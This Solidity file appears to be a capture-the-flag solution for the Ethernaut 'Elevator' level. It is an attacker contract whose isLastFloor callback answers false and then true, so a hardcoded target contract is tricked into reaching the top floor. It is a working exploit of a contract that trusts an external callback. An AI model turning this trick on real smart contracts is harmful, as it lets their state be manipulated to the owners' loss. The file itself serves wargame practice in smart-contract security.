interface Elevators {
    function goTo(uint _floor) external;
}


contract Elevator {
    
    bool switchs = false;

    function react() public {
        Elevators eleve = Elevators(0xf914175a6F50d811b04808985192c00976005CE0);
        eleve.goTo(1);
    }

    function isLastFloor(uint _floor) public returns(bool) {
       if(!switchs) {
          switchs = true;
       }else{
           return true;
       }
    }
}
